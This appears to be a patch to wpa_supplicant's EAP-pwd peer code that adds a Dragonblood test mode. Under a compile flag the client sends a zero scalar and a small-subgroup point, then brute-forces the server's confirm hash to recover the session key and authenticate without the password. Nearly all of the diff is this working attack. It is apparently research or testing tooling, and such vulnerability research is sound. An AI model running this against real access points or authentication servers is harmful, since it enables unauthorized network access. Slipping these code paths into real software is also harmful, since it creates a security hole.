@@ -17,6 +17,7 @@
 #include "eap_peer/eap_i.h"
 #include "eap_common/eap_pwd_common.h"
 
+#include "common/attacks.h"
 
 struct eap_pwd_data {
 	enum {
@@ -34,6 +35,10 @@ struct eap_pwd_data {
 	u8 prep;
 	u8 token[4];
 	EAP_PWD_group *grp;
+#ifdef DRAGONBLOOD_TESTS
+	struct crypto_ec *subgroup;
+	struct crypto_ec_point *subgroup_generator;
+#endif
 
 	struct wpabuf *inbuf;
 	size_t in_frag_pos;
@@ -556,6 +561,23 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 		goto fin;
 	}
 
+/** Test if a scalar equal to zero is accepted */
+#ifdef DRAGONBLOOD_TESTS
+	if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
+	                      data->private_value, mask) < 0 ||
+	    crypto_bignum_add(data->private_value, mask,
+			      data->my_scalar) < 0 ||
+	    crypto_bignum_mod(data->my_scalar,
+			      crypto_ec_get_order(data->grp->group),
+			      data->my_scalar) < 0) {
+		wpa_printf(MSG_INFO,
+			   "EAP-pwd (peer): unable to force scalar for zero");
+		goto fin;
+	}
+
+	printf("\n>>> %s: setting scalar to zero\n\n", __FUNCTION__);
+#endif // DRAGONBLOOD_TESTS
+
 	if (crypto_ec_point_mul(data->grp->group, data->grp->pwe, mask,
 				data->my_element) < 0) {
 		wpa_printf(MSG_INFO, "EAP-PWD (peer): element allocation "
@@ -672,6 +694,25 @@ eap_pwd_perform_commit_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 	if (data->outbuf == NULL)
 		goto fin;
 
+/** We send the subgroup generator as our peer element */
+#ifdef DRAGONBLOOD_TESTS
+	if (data->subgroup == NULL) {
+		data->subgroup = crypto_ec_subgroup(&data->subgroup_generator);
+		if (data->subgroup == NULL) {
+			printf(">>> Error retrieving subgroup parameters!\n");
+			exit(1);
+		}
+		printf(">>> Successfully configured subgroup!\n");
+	}
+
+	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, element,
+				   element + prime_len) != 0) {
+		printf(">>> subgroup assignment failed!\n");
+		exit(1);
+	}
+	printf(">>> Successfully assigned subgroup generator!\n");
+#endif // DRAGONBLOOD_TESTS
+
 	/* we send the element as (x,y) follwed by the scalar */
 	wpabuf_put_data(data->outbuf, element, 2 * prime_len);
 	wpabuf_put_data(data->outbuf, scalar, order_len);
@@ -690,6 +731,7 @@ fin:
 }
 
 
+#ifndef DRAGONBLOOD_TESTS
 static void
 eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
 				 struct eap_method_ret *ret,
@@ -867,6 +909,227 @@ fin:
 	if (hash)
 		eap_pwd_h_final(hash, conf);
 }
+#else
+static void
+eap_pwd_perform_confirm_exchange(struct eap_sm *sm, struct eap_pwd_data *data,
+				 struct eap_method_ret *ret,
+				 const struct wpabuf *reqData,
+				 const u8 *payload, size_t payload_len)
+{
+	struct crypto_hash *hash = NULL;
+	u32 cs, peer_rand;
+	u16 grp;
+	u8 conf[SHA256_MAC_LEN], *cruft = NULL, *ptr;
+	size_t prime_len = 0, order_len = 0;
+
+	if (data->state != PWD_Confirm_Req) {
+		ret->ignore = TRUE;
+		goto fin;
+	}
+
+	if (payload_len != SHA256_MAC_LEN) {
+		wpa_printf(MSG_INFO,
+			   "EAP-pwd: Unexpected Confirm payload length %u (expected %u)",
+			   (unsigned int) payload_len, SHA256_MAC_LEN);
+		goto fin;
+	}
+
+	prime_len = crypto_ec_prime_len(data->grp->group);
+	order_len = crypto_ec_order_len(data->grp->group);
+
+	/*
+	 * first build up the ciphersuite which is group | random_function |
+	 *	prf
+	 */
+	grp = htons(data->group_num);
+	ptr = (u8 *) &cs;
+	os_memcpy(ptr, &grp, sizeof(u16));
+	ptr += sizeof(u16);
+	*ptr = EAP_PWD_DEFAULT_RAND_FUNC;
+	ptr += sizeof(u8);
+	*ptr = EAP_PWD_DEFAULT_PRF;
+
+	/* each component of the point will be at most as big as the prime */
+	cruft = os_malloc(prime_len * 2);
+	if (!cruft) {
+		wpa_printf(MSG_INFO, "EAP-PWD (server): confirm allocation "
+			   "fail");
+		goto fin;
+	}
+
+	// ========================================== PART 1: Calculate peer confirm =================================================
+
+	struct crypto_ec_point *point_k = crypto_ec_point_init(data->subgroup);
+	struct crypto_bignum *bignum_rand = crypto_bignum_init();
+	struct crypto_bignum *k_xcoord = crypto_bignum_init();
+
+	peer_rand = 1;
+	while (peer_rand < 269)
+	{
+		memset(cruft, 0, prime_len * 2);
+
+		/*
+		 * server's commit is H(k | server_element | server_scalar |
+		 *			peer_element | peer_scalar | ciphersuite)
+		 */
+		hash = eap_pwd_h_init();
+		if (hash == NULL)
+			goto fin;
+
+		/*
+		 * zero the memory each time because this is mod prime math and some
+		 * value may start with a few zeros and the previous one did not.
+		 */
+
+		/* Replace the secret key k with a result from the subgroup calculation */
+		if (crypto_bignum_setint(bignum_rand, peer_rand)) {
+			printf(">>> %s: converting peer_rand to bignum failed\n", __FUNCTION__);
+			exit(1);
+		}
+		if (crypto_ec_point_mul(data->subgroup, data->subgroup_generator, bignum_rand, point_k)) {
+			printf(">>> %s: point multiplication failed\n", __FUNCTION__);
+			exit(1);
+		}
+		if (crypto_ec_point_x(data->subgroup, point_k, k_xcoord)) {
+			printf(">>> %s: failed to get X-coordinate of k\n", __FUNCTION__);
+			exit(1);
+		}
+		crypto_bignum_to_bin(k_xcoord, cruft, prime_len, prime_len);
+
+		eap_pwd_h_update(hash, cruft, prime_len);
+
+		/* server element: x, y */
+		if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
+					   cruft, cruft + prime_len) != 0) {
+			wpa_printf(MSG_INFO, "EAP-PWD (server): confirm point "
+				   "assignment fail");
+			goto fin;
+		}
+		eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+		/* server scalar */
+		crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
+		eap_pwd_h_update(hash, cruft, order_len);
+
+		/* my element was the generator of the subgroup */
+		if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
+					   cruft + prime_len) != 0) {
+			printf(">>> %s: failed to force invalid curve point\n", __FUNCTION__);
+			exit(1);
+		}
+		printf("\n>>> %s: set invalid EC point\n\n", __FUNCTION__);
+
+		eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+		/* my scalar */
+		crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
+		eap_pwd_h_update(hash, cruft, order_len);
+
+		/* the ciphersuite */
+		eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
+
+		/* random function fin */
+		eap_pwd_h_final(hash, conf);
+		hash = NULL;
+
+		ptr = (u8 *) payload;
+		if (os_memcmp_const(conf, ptr, SHA256_MAC_LEN) == 0)
+			break;
+
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm did not verify");
+		peer_rand++;
+	}
+
+	if (peer_rand > 269) {
+		printf(">>> %s: FAILED TO RECOVER SESSION KEY!\n", __FUNCTION__);
+		exit(1);
+		//goto fin;
+	}
+
+	wpa_printf(MSG_DEBUG, "EAP-pwd (peer): confirm verified");
+
+	// Set the recovered session key !!
+	data->k = k_xcoord;
+
+	// ========================================== PART 2: Calculate our confirm =================================================
+
+	/*
+	 * compute confirm:
+	 *  H(k | peer_element | peer_scalar | server_element | server_scalar |
+	 *    ciphersuite)
+	 */
+	hash = eap_pwd_h_init();
+	if (hash == NULL)
+		goto fin;
+
+	/* k */
+	crypto_bignum_to_bin(data->k, cruft, prime_len, prime_len);
+	eap_pwd_h_update(hash, cruft, prime_len);
+
+	/* my element was the generator of the subgroup */
+	if (crypto_ec_point_to_bin(data->subgroup, data->subgroup_generator, cruft,
+				   cruft + prime_len) != 0) {
+		printf(">>> %s: failed to force invalid curve point\n", __FUNCTION__);
+		exit(1);
+	}
+	printf("\n>>> %s: set invalid EC point\n\n", __FUNCTION__);
+
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* my scalar */
+	crypto_bignum_to_bin(data->my_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* server element: x, y */
+	if (crypto_ec_point_to_bin(data->grp->group, data->server_element,
+				   cruft, cruft + prime_len) != 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): confirm point "
+			   "assignment fail");
+		goto fin;
+	}
+	eap_pwd_h_update(hash, cruft, prime_len * 2);
+
+	/* server scalar */
+	crypto_bignum_to_bin(data->server_scalar, cruft, order_len, order_len);
+	eap_pwd_h_update(hash, cruft, order_len);
+
+	/* the ciphersuite */
+	eap_pwd_h_update(hash, (u8 *) &cs, sizeof(u32));
+
+	/* all done */
+	eap_pwd_h_final(hash, conf);
+	hash = NULL;
+
+	if (compute_keys(data->grp, data->k,
+			 data->my_scalar, data->server_scalar, conf, ptr,
+			 &cs, data->msk, data->emsk, data->session_id) < 0) {
+		wpa_printf(MSG_INFO, "EAP-PWD (peer): unable to compute MSK | "
+			   "EMSK");
+		goto fin;
+	}
+
+	data->outbuf = wpabuf_alloc(SHA256_MAC_LEN);
+	if (data->outbuf == NULL)
+		goto fin;
+
+	wpabuf_put_data(data->outbuf, conf, SHA256_MAC_LEN);
+
+fin:
+	bin_clear_free(cruft, prime_len * 2);
+	if (data->outbuf == NULL) {
+		ret->methodState = METHOD_DONE;
+		ret->decision = DECISION_FAIL;
+		eap_pwd_state(data, FAILURE);
+	} else {
+		eap_pwd_state(data, SUCCESS_ON_FRAG_COMPLETION);
+	}
+
+	/* clean allocated memory */
+	if (hash)
+		eap_pwd_h_final(hash, conf);
+}
+
+#endif // DRAGONBLOOD_TESTS
 
 
 static struct wpabuf *
